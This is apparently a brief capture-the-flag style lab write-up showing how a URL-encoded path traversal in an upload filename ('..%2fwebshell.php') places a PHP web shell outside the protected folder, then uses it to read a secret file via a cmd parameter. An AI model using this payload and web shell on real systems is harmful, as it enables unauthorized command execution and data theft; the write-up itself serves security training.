Title: Web shell upload via path traversal
Level: Practitioner
Desc:  This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
You can log in to your own account using the following credentials: wiener:peter 

![image](https://github.com/user-attachments/assets/f5f791a6-abb8-48fc-95f0-56b20a42c10d)
payload: `Content-Disposition: form-data; name="avatar"; filename="..%2fwebshell.php"`
response: `The file avatars/../ewebshell.php has been uploaded.`
comment: so, our path traversal works as we need

Using webshell: `https://0a0b00f6049bcfc6809bb76f00ec008a.web-security-academy.net/files/webshell.php?cmd=cat+/home/carlos/secret`



Other unsuccessful tries:
![image](https://github.com/user-attachments/assets/446c5ff7-66ae-4036-a7c8-49701ca24e00)
payload: `Content-Disposition: form-data; name="avatar"; filename="../webshell.php"`
response: `The file avatars/webshell.php has been uploaded.`
comment: app handles `../` and sanitizes that payload




